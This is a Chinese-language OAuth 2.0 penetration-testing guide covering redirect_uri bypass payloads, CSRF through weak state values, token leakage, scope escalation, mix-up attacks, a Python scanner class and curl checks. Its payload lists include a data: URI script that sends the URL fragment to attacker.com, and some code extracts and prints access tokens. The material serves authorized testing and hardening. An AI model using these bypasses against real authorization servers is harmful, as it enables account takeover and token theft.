# OAuth 2.0 安全测试

> **合规声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得明确书面授权后进行任何安全测试活动。

---

## 目录

1. [OAuth 2.0 基础流程](#1-oauth-20-基础流程)
2. [常见漏洞](#2-常见漏洞)
3. [检测方法](#3-检测方法)
4. [案例](#4-案例)

---

## 1. OAuth 2.0 基础流程

### 角色定义

| 角色 | 说明 | 示例 |
|------|------|------|
| **Resource Owner** | 资源所有者（用户） | 你，应用的用户 |
| **Client** | 第三方应用 | 你的 Web/移动应用 |
| **Authorization Server** | 授权服务器 | Google / GitHub / 自建 |
| **Resource Server** | 资源服务器 | API 服务器 |

### 授权码模式（Authorization Code Grant）— 最常用

```
┌──────────┐          ┌──────────┐          ┌──────────┐
│  User    │          │  Client  │          │   Auth   │
│ (Browser)│          │  (App)   │          │  Server  │
└────┬─────┘          └────┬─────┘          └────┬─────┘
     │                     │                     │
     │  1. Login with     │                     │
     │   Google Click     │                     │
     │────────────────────┼────────────────────>│
     │                     │                     │
     │  2. Auth Code      │                     │
     │<────────────────────┼────────────────────│
     │                     │                     │
     │                     │  3. Code + Secret   │
     │                     │────────────────────>│
     │                     │                     │
     │                     │  4. Access Token    │
     │                     │<────────────────────│
     │                     │                     │
     │                     │  5. API Call + Token│
     │                     │────────────────────>│  Resource Server
```

### 常见端点

```
# 授权端点（用户浏览器跳转）
GET https://auth.example.com/oauth/authorize?
  response_type=code&
  client_id=YOUR_CLIENT_ID&
  redirect_uri=https://client.example.com/callback&
  scope=openid%20profile&
  state=random_csrf_token

# Token 端点（服务器到服务器）
POST https://auth.example.com/oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE&
redirect_uri=https://client.example.com/callback&
client_id=YOUR_CLIENT_ID&
client_secret=YOUR_CLIENT_SECRET

# 资源端点（携带 Token 访问）
GET https://api.example.com/user
Authorization: Bearer ACCESS_TOKEN
```

### 隐式模式（Implicit Grant）— 已废弃

```bash
# 直接返回 Access Token（不安全，已废弃）
GET https://auth.example.com/oauth/authorize?
  response_type=token&
  client_id=YOUR_CLIENT_ID&
  redirect_uri=https://client.example.com/callback&
  scope=openid%20profile&
  state=random_csrf_token

# 响应: #access_token=abc123&token_type=Bearer&expires_in=3600
```

---

## 2. 常见漏洞

### 2.1 Redirect URI 劫持

#### 原理
授权服务器未严格验证 `redirect_uri`，允许攻击者将授权码或 Token 重定向到攻击者控制的 URL。

#### 绕过技巧

```bash
# 1. URL 路径遍历
https://client.example.com/callback/attacker.com
https://client.example.com/callback/..%2F..%2Fattacker.com
https://client.example.com/callback..%2Fattacker.com

# 2. 子域名开放重定向
https://attacker.example.com/callback  # 如果 client 可以注册任意子域名

# 3. 使用开放式重定向
https://client.example.com/redirect?url=https://attacker.com

# 4. 域名相似性
https://client.example.com.attacker.com/callback  # 子域名欺骗
https://client.example.com%40attacker.com/callback
https://client.example.comattacker.com/callback

# 5. 端口绕过
https://client.example.com:8080/callback  # 如果端口验证不严格

# 6. 跨协议
https://client.example.com/callback#@attacker.com

# 7. 使用特殊字符
https://client.example.com/callback\@attacker.com
https://client.example.com/callback/\/attacker.com/

# 8. 使用 data: URI（极少数情况）
data:text/html,<script>location='https://attacker.com?'+document.location.hash</script>

# 9. 使用 localhost 或 127.0.0.1 绕过白名单
https://127.0.0.1/callback
http://localhost:9999/callback
```

#### Python 测试

```python
import requests
import urllib.parse

def test_redirect_uri_vulnerability(auth_endpoint, client_id, valid_redirect_uri):
    """测试 Redirect URI 劫持"""
    bypass_payloads = [
        # 基本路径添加
        f"{valid_redirect_uri}/attacker.com",
        f"{valid_redirect_uri}/..%2Fattacker.com",

        # 子域名
        f"https://evil.com/{valid_redirect_uri.split('://')[1]}",

        # 参数
        f"{valid_redirect_uri}?redirect=https://evil.com",

        # 特殊符号
        f"{valid_redirect_uri}.evil.com",
        f"https://evil.com#{valid_redirect_uri}",

        # 本地回环
        "http://127.0.0.1:8080/callback",
        "http://localhost:9999/callback",
        "https://0.0.0.0/callback",

        # 端口绕过
        valid_redirect_uri.replace(":443", ":8080"),

        # DATA URI
        "data:text/html,<script>alert(1)</script>",
    ]

    for redirect_uri in bypass_payloads:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "scope": "openid profile",
            "state": "test123",
        }
        try:
            auth_url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"
            r = requests.get(auth_url, allow_redirects=False, timeout=10)

            # 如果授权服务器接受了恶意 redirect_uri
            if r.status_code in [302, 303, 307]:
                location = r.headers.get("Location", "")
                if "code=" in location:
                    print(f"[!] Redirect URI accepted: {redirect_uri}")
                    print(f"    Location: {location[:150]}")
                elif "error=invalid_request" not in location.lower():
                    print(f"[?] Non-standard response for: {redirect_uri}")
                    print(f"    Location: {location[:150]}")
        except Exception as e:
            print(f"[!] Error: {e}")
```

### 2.2 CSRF（state 参数缺失/弱随机）

#### 原理
OAuth 流程中的 `state` 参数用于防止 CSRF 攻击。如果 `state` 缺失、固定或可预测，攻击者可构造伪造的登录回调，将受害者账户绑定到攻击者的第三方账号。

#### 测试方法

```bash
# 步骤1：正常登录流程中检查 state
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback&state=123456"

# 检查响应中是否包含 state 参数
# 如果 state 是固定的（如 "123456"）、可预测的（时间戳）、或缺失，则存在 CSRF 风险

# 步骤2：尝试不传 state
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback"

# 步骤3：尝试篡改 state
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback&state=attacker_controlled"
```

#### Python CSRF 检测

```python
import requests
import re
import time

def test_state_vulnerability(auth_endpoint: str, client_id: str, redirect_uri: str):
    """检测 OAuth state 参数安全"""
    results = {}

    # 测试 1：不传 state
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "openid profile",
    }
    r = requests.get(auth_endpoint, params=params, allow_redirects=False)
    location = r.headers.get("Location", "")
    results["no_state"] = "state=" not in location
    if results["no_state"]:
        print("[!] state parameter is MISSING")

    # 测试 2：state 是否固定
    states = set()
    for i in range(5):
        params["state"] = f"test{i}"
        r = requests.get(auth_endpoint, params=params, allow_redirects=False)
        loc = r.headers.get("Location", "")
        m = re.search(r"state=([^&]+)", loc)
        if m:
            states.add(m.group(1))

    results["fixed_state"] = len(states) == 1
    if results["fixed_state"]:
        print(f"[!] state parameter is FIXED: {states}")

    # 测试 3：state 是否可预测（时间戳）
    params["state"] = str(int(time.time()))
    r = requests.get(auth_endpoint, params=params, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"state=([^&]+)", loc)
    if m:
        returned_state = m.group(1)
        # 如果是时间戳，尝试 -1 和 +1 验证
        results["predictable_state"] = abs(int(returned_state) - int(time.time())) < 2
        if results["predictable_state"]:
            print(f"[!] state parameter is PREDICTABLE (timestamp-like): {returned_state}")

    return results
```

#### CSRF 攻击示例（三步骤）

```python
"""
OAuth CSRF 攻击流程：
1. 攻击者注册自己控制的第三方账号
2. 攻击者用受害者账号开始 OAuth 流程，获取 authorization code
3. 攻击者将 code 通过某种方式发给受害者
4. 受害者点击后，自己的账户绑定了攻击者的第三方账号
5. 攻击者通过自己的第三方账号登录受害者账户

检测方法：验证 state 是否使用不可预测的随机值。
"""
```

### 2.3 Code/Token 泄露

#### 泄露途径

```python
import re
import requests

# 1. Referer Header 泄露
# 目标页面引用了第三方资源，code/token 通过 Referer 泄露
def check_referer_leak(url: str):
    """检查是否存在 Referer 泄露风险"""
    r = requests.get(url)
    # 检查页面中加载的外部资源
    external_resources = re.findall(
        r'(src|href)="https?://(?!' + re.escape(url.split("/")[2]) + r')',
        r.text
    )
    return len(external_resources) > 0


# 2. URL Fragment 泄露（Implicit Grant）
# #access_token=xxx 可能在以下场景泄露：
# - 浏览器历史记录
# - 代理日志
# - Referer Header
# - JavaScript 错误日志

# 3. 日志泄露
# 服务器日志记录了完整 URL（包括 code/access_token 参数）
curl_cmd = """
# 检查授权回调是否被记录（需授权）
curl -X GET "https://target.com/callback?code=AUTH_CODE&state=xxx"
"""

# 4. 第三方脚本
# 页面中的第三方 JS（分析工具、广告）可以访问 URL hash
script_example = """
<!-- 如果页面包含第三方脚本 -->
<script src="https://www.google-analytics.com/analytics.js"></script>
<script>
  // 第三方脚本可读取 location.hash 中的 access_token
  console.log(location.hash);
</script>
"""

# 5. 移动端 Deep Link
# 恶意应用可以注册相同的 URL Scheme 拦截回调
deep_link_security = """
Android: AndroidManifest.xml 中 intent-filter 的 data android:scheme 被恶意应用劫持
iOS: URL Scheme 冲突，恶意 App 可以注册同一 Scheme
"""
```

### 2.4 Scope 越权

#### 原理
应用请求特定 scope 但用户未明确同意，或 scope 被篡改后服务器未正确验证。

#### Scope 枚举

```python
import requests

base = "https://auth.example.com/oauth/authorize"
client_id = "APP_ID"
redirect_uri = "https://app.com/callback"

# 常见 scope
scopes = [
    "openid",
    "profile",
    "email",
    "phone",
    "address",
    "user:email",
    "user:profile",
    "read:user",
    "write:user",
    "admin",
    "admin:read",
    "admin:write",
    "repo",
    "repo:admin",
    "delete:user",
    "user:admin",
    "user:delete",
    "user:password",
    "user:phone",
    "user:bank",
    "wallet",
    "wallet:read",
    "wallet:write",
    "payment",
    "payment:read",
]

for scope in scopes:
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": scope,
        "state": "test",
    }
    r = requests.get(base, params=params, allow_redirects=False)
    location = r.headers.get("Location", "")

    if "error=invalid_scope" in location:
        continue  # scope 不存在
    elif "code=" in location:
        print(f"[!] Scope accepted: {scope}")
    elif "consent" in location.lower():
        print(f"[?] Consent page shown for scope: {scope}")
```

#### Scope 提权测试

```python
import requests

def test_scope_escalation(token_endpoint: str, client_id: str,
                          client_secret: str, code: str,
                          redirect_uri: str):
    """测试 Scope 提权"""
    # 基础 scope（应用程序注册的最小 scope）
    base_scope = "openid profile"

    # 尝试请求更大的 scope
    escalation_scopes = [
        "openid profile email",          # +email
        "openid profile admin",          # +admin
        "openid profile user:admin",     # +管理员权限
        "openid profile repo",           # +仓库权限
        "openid profile wallet",         # +钱包权限
        "openid profile *",              # 通配符
        "openid profile all",            # 所有权限
    ]

    for scope in escalation_scopes:
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri,
            "client_id": client_id,
            "client_secret": client_secret,
            "scope": scope,  # 尝试修改 scope
        }
        r = requests.post(token_endpoint, data=data)
        if r.status_code == 200 and "access_token" in r.json():
            token = r.json()["access_token"]
            print(f"[!] Scope escalation! Requested '{scope}'")
            print(f"    Token: {token[:50]}...")

            # 验证实际 scope
            verify = requests.get(
                "https://api.example.com/user",
                headers={"Authorization": f"Bearer {token}"}
            )
            print(f"    API response: {verify.text[:200]}")
```

### 2.5 混合攻击（Mix-up Attack）

#### 原理
攻击者注册自己的 Client，伪造授权服务器，诱导用户授权后窃取权限。

#### 攻击流程

```python
"""
Mix-up Attack 检测

1. 授权服务器是否验证 redirect_uri 的客户端身份
2. Token 端点是否要求 client_credentials 验证
3. 是否存在开放重定向漏洞可以配合

检测方法：
"""
import requests

def check_mixup_vulnerability(auth_endpoint: str, token_endpoint: str,
                              client_id: str, redirect_uri: str):
    """检测混合攻击漏洞"""

    # 测试1：redirect_uri 是否可以指向攻击者控制的域名
    malicious_redirect = "https://attacker.com/oauth/callback"
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": malicious_redirect,
        "scope": "openid profile",
        "state": "test",
    }
    r = requests.get(auth_endpoint, params=params, allow_redirects=False)
    if "code=" in r.headers.get("Location", ""):
        print(f"[!] Accepts arbitrary redirect_uri: {malicious_redirect}")

    # 测试2：code 是否可以与其他 client 交换 token
    # （需要知道另一个 client 的配置）
    test_code = "TEST_CODE_FROM_OTHER_CLIENT"
    data = {
        "grant_type": "authorization_code",
        "code": test_code,
        "redirect_uri": redirect_uri,
        "client_id": client_id,
        "client_secret": "ANOTHER_CLIENT_SECRET",
    }
    r = requests.post(token_endpoint, data=data)
    if r.status_code == 200 and "access_token" in r.json():
        print("[!] Code can be exchanged by different client!")

    # 测试3：response_type 篡改
    params["response_type"] = "token id_token"
    r = requests.get(auth_endpoint, params=params, allow_redirects=False)
    if "access_token" in r.headers.get("Location", ""):
        print("[!] response_type can be altered to implicit grant")
```

### 2.6 Implicit Grant 滥用

隐式模式（Implicit Grant）已被 OAuth 2.0 Security BCP 废弃，但仍有很多旧系统使用。

```python
import requests
import webbrowser

def test_implicit_grant(auth_endpoint: str, client_id: str, redirect_uri: str):
    """测试 Implicit Grant 是否存在"""

    # 尝试使用 implicit grant
    params = {
        "response_type": "token",  # 区别于 authorization code 的 "code"
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "openid profile",
        "state": "test",
    }
    r = requests.get(auth_endpoint, params=params, allow_redirects=False)
    location = r.headers.get("Location", "")

    if "#access_token=" in location:
        # 提取 Token
        import re
        access_token = re.search(r"#access_token=([^&]+)", location)
        token_type = re.search(r"token_type=([^&]+)", location)

        print(f"[!] Implicit Grant is supported!")
        if access_token:
            print(f"    Access Token: {access_token.group(1)[:50]}...")

        # 测试 Token 的有效性
        resource_url = "https://api.example.com/userinfo"
        r2 = requests.get(resource_url,
                         headers={"Authorization": f"Bearer {access_token.group(1)}"})
        print(f"    Resource response: {r2.status_code}")
        return True

    return False
```

---

## 3. 检测方法

### 3.1 完整检测流程

```python
#!/usr/bin/env python3
"""
OAuth 2.0 安全检测框架
"""

import requests
import json
import re
import time
import secrets
from typing import Dict, Optional
from urllib.parse import urlparse, parse_qs


class OAuthSecurityChecker:
    """OAuth 2.0 安全检测器"""

    def __init__(self, config: Dict):
        self.auth_endpoint = config.get("auth_endpoint")
        self.token_endpoint = config.get("token_endpoint")
        self.client_id = config.get("client_id")
        self.client_secret = config.get("client_secret")
        self.redirect_uri = config.get("redirect_uri")
        self.resource_url = config.get("resource_url")

        self.session = requests.Session()
        self.results = []

    def log(self, severity: str, message: str, detail: str = ""):
        """记录检测结果"""
        self.results.append({
            "severity": severity,
            "message": message,
            "detail": detail,
        })
        icon = {"CRITICAL": "[!!!]", "HIGH": "[!!]", "MEDIUM": "[!]",
                "LOW": "[?]", "INFO": "[*]"}
        print(f"{icon.get(severity, '[*]')} {message}")
        if detail:
            print(f"       {detail[:200]}")

    def check_redirect_uri_validation(self):
        """检查 Redirect URI 验证"""
        self.log("INFO", "Checking redirect_uri validation...")

        if not self.auth_endpoint:
            return

        bypass_attempts = [
            (f"{self.redirect_uri}/attacker.com", "path addition"),
            (f"{self.redirect_uri}.attacker.com", "subdomain"),
            (f"https://attacker.com?url={self.redirect_uri}", "parameter"),
            (f"https://attacker.com#{self.redirect_uri}", "fragment"),
            (f"{self.redirect_uri}?redirect=https://attacker.com", "redirect param"),
            ("http://127.0.0.1:8080/callback", "localhost"),
            ("https://0.0.0.0/callback", "zero IP"),
            (self.redirect_uri.replace("https", "http"), "protocol downgrade"),
        ]

        for uri, desc in bypass_attempts:
            params = {
                "response_type": "code",
                "client_id": self.client_id,
                "redirect_uri": uri,
                "scope": "openid",
                "state": "test",
            }
            try:
                r = self.session.get(self.auth_endpoint, params=params,
                                     allow_redirects=False, timeout=10)
                location = r.headers.get("Location", "")
                if "code=" in location:
                    self.log("HIGH", f"Redirect URI bypass via {desc}",
                             f"URI: {uri}")
            except:
                pass

    def check_state_parameter(self):
        """检查 state 参数"""
        self.log("INFO", "Checking state parameter...")

        # 1. state 缺失
        params = {
            "response_type": "code",
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid",
        }
        r = self.session.get(self.auth_endpoint, params=params,
                            allow_redirects=False)
        location = r.headers.get("Location", "")
        if "state=" not in location:
            self.log("MEDIUM", "State parameter is MISSING",
                     "CSRF attack vector")
        else:
            # 2. state 可预测性
            states = []
            for i in range(5):
                r = self.session.get(self.auth_endpoint, params=params,
                                    allow_redirects=False)
                loc = r.headers.get("Location", "")
                m = re.search(r"state=([^&]+)", loc)
                if m:
                    states.append(m.group(1))

            unique_states = set(states)
            if len(unique_states) <= 1:
                self.log("MEDIUM", "State parameter is FIXED",
                         f"Always returns: {unique_states}")
            elif len(unique_states) < 3:
                self.log("LOW", f"State has low entropy ({len(unique_states)} values in 5 tries)")

    def check_token_endpoint_security(self):
        """检查 Token 端点"""
        self.log("INFO", "Checking token endpoint security...")

        # 测试 client_secret 是否必填
        code = "FAKE_CODE_FOR_TESTING"
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": self.redirect_uri,
            "client_id": self.client_id,
        }

        # 不传 client_secret
        r = self.session.post(self.token_endpoint, data=data)
        if r.status_code == 200 and "access_token" in r.json():
            self.log("HIGH", "Token endpoint does NOT require client_secret",
                     "Code-to-token exchange can be done without authentication")

        # 测试 code 重用
        if self.client_secret:
            data["client_secret"] = self.client_secret
            r1 = self.session.post(self.token_endpoint, data=data)
            if r1.status_code == 200:
                # 第二次使用相同 code
                r2 = self.session.post(self.token_endpoint, data=data)
                if r2.status_code == 200:
                    self.log("MEDIUM", "Authorization code can be reused",
                             "Single-use code constraint not enforced")

    def check_scope_validation(self):
        """检查 Scope 验证"""
        self.log("INFO", "Checking scope validation...")

        # 测试请求未注册的 scope
        dangerous_scopes = [
            "admin", "read:admin", "user:admin",
            "delete", "write:admin",
            "user:delete", "user:password",
            "payment", "wallet",
        ]

        for scope in dangerous_scopes:
            params = {
                "response_type": "code",
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "scope": scope,
                "state": "test",
            }
            r = self.session.get(self.auth_endpoint, params=params,
                                allow_redirects=False)
            location = r.headers.get("Location", "")
            if "code=" in location:
                self.log("MEDIUM", f"Unexpected scope granted: '{scope}'")
            elif "consent" in location.lower() or "approve" in location.lower():
                self.log("INFO", f"Consent shown for scope '{scope}'")

    def check_authorization_code_injection(self):
        """检查授权码注入"""
        self.log("INFO", "Checking authorization code injection...")

        # 测试 response_type 篡改
        params = {
            "response_type": "token",  # 试图切换到 implicit
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid",
            "state": "test",
        }
        r = self.session.get(self.auth_endpoint, params=params,
                            allow_redirects=False)
        location = r.headers.get("Location", "")
        if "#access_token=" in location:
            self.log("HIGH", "Implicit Grant (response_type=token) is enabled",
                     "Response type can be switched from code to token")

    def run_full_check(self) -> Dict:
        """运行完整检测"""
        print("=" * 60)
        print("OAuth 2.0 Security Check")
        print("=" * 60)
        print(f"Auth Endpoint: {self.auth_endpoint}")
        print(f"Token Endpoint: {self.token_endpoint}")
        print(f"Client ID: {self.client_id}")
        print(f"Redirect URI: {self.redirect_uri}")
        print()

        self.check_redirect_uri_validation()
        self.check_state_parameter()
        self.check_token_endpoint_security()
        self.check_scope_validation()
        self.check_authorization_code_injection()

        print("\n" + "=" * 60)
        print("Summary:")
        print(f"  Critical: {sum(1 for r in self.results if r['severity'] == 'CRITICAL')}")
        print(f"  High: {sum(1 for r in self.results if r['severity'] == 'HIGH')}")
        print(f"  Medium: {sum(1 for r in self.results if r['severity'] == 'MEDIUM')}")
        print(f"  Low: {sum(1 for r in self.results if r['severity'] == 'LOW')}")

        return {"endpoints": {
            "auth": self.auth_endpoint,
            "token": self.token_endpoint,
        }, "results": self.results}


# 使用
if __name__ == "__main__":
    config = {
        "auth_endpoint": "https://auth.example.com/oauth/authorize",
        "token_endpoint": "https://auth.example.com/oauth/token",
        "client_id": "your_client_id",
        "client_secret": "your_client_secret",
        "redirect_uri": "https://yourapp.com/callback",
        "resource_url": "https://api.example.com/userinfo",
    }
    checker = OAuthSecurityChecker(config)
    results = checker.run_full_check()
```

### 3.2 手动检测清单

```bash
# 1. 检查 redirect_uri 验证
# 尝试不同的 redirect_uri 变体
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP_ID&redirect_uri=https://evil.com&scope=openid&state=test"

# 2. 检查 state 参数
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP_ID&redirect_uri=https://app.com/callback&scope=openid"

# 3. 检查 Token 端点 HTTPS 强制
curl -v -k "http://auth.example.com/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=https://app.com/callback&client_id=APP_ID&client_secret=SECRET"

# 4. 检查 scope 枚举
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP_ID&redirect_uri=https://app.com/callback&scope=admin&state=test"

# 5. 检查 code 重用
# 第一次
CODE=$(curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=APP_ID&..." 2>&1 | grep -o "code=[^&]*" | cut -d= -f2)
# 交换 Token
curl "https://auth.example.com/oauth/token" -d "grant_type=authorization_code&code=$CODE&client_id=APP_ID&client_secret=SECRET&redirect_uri=https://app.com/callback"
# 再次尝试（应该失败）
curl "https://auth.example.com/oauth/token" -d "grant_type=authorization_code&code=$CODE&client_id=APP_ID&client_secret=SECRET&redirect_uri=https://app.com/callback"
```

---

## 4. 案例

### 案例 1：Facebook 账号接管（Redirect URI）

- **漏洞**: Facebook OAuth 的 redirect_uri 参数验证不严
- **利用**: 使用 `https://apps.facebook.com/victim-app/redirect?url=https://attacker.com`
- **影响**: 攻击者可获取用户的 Facebook 授权码
- **修复**: 严格验证 redirect_uri 必须完全匹配注册值

### 案例 2：GitHub OAuth CSRF

- **漏洞**: 第三方应用未使用 state 参数
- **利用**: 攻击者用自己的 GitHub 账号完成 OAuth，将 code 发给受害者。受害者的账号绑定了攻击者的 GitHub
- **影响**: 攻击者通过自己的 GitHub 登录受害者账号
- **修复**: 使用不可预测的随机 state 参数，并在回调中验证

### 案例 3：Google OAuth Scope 提权

- **场景**: 应用请求 `openid profile` 基础 scope
- **漏洞**: Token 端点未验证 scope，或用户默认同意所有请求的 scope
- **利用**: 在 Token 交换时修改 scope 参数
- **修复**: Token 端点强制验证 scope 是否与授权请求一致

### 案例 4：微信开放平台 OAuth 漏洞

- **场景**: 网站使用微信扫码登录
- **漏洞**: redirect_uri 校验不严格，允许使用 `http` 而不是 `https`；state 可预测
- **利用**:
  1. 攻击者构造恶意链接，将 redirect_uri 指向 `http://attacker.com`
  2. 用户扫码后，微信授权码被发送到攻击者服务器
  3. 攻击者用授权码登录受害者账号
- **修复**: 强制 HTTPS + 严格 redirect_uri 校验 + 随机 state

### 案例 5：OAuth Implicit Grant Token 泄露

- **场景**: 使用 Implicit Grant 的 SPA 应用
- **漏洞**: Token 在 URL Fragment 中传递，泄露途径多
- **利用**:
  1. 第三方 JS 脚本读取 `location.hash`
  2. 浏览器历史记录同步
  3. 中间代理记录完整 URL
- **修复**: 迁移到 Authorization Code + PKCE

---

## 检查清单

- [ ] redirect_uri 是否严格白名单
- [ ] state 参数是否存在且随机
- [ ] Token 端点是否要求 client authentication
- [ ] 授权码是否一次性
- [ ] Token 交换时 scope 是否被篡改
- [ ] 是否支持存在隐患的 Implicit Grant
- [ ] Token 是否通过安全通道传输（HTTPS）
- [ ] Token 是否有适当的过期时间
- [ ] Refresh Token 是否安全存储
- [ ] PKCE 是否用于公共客户端（SPA/移动端）

> **提醒**: 所有 OAuth 安全测试需在授权范围内进行。测试时应避免窃取真实用户的 Token 或数据。
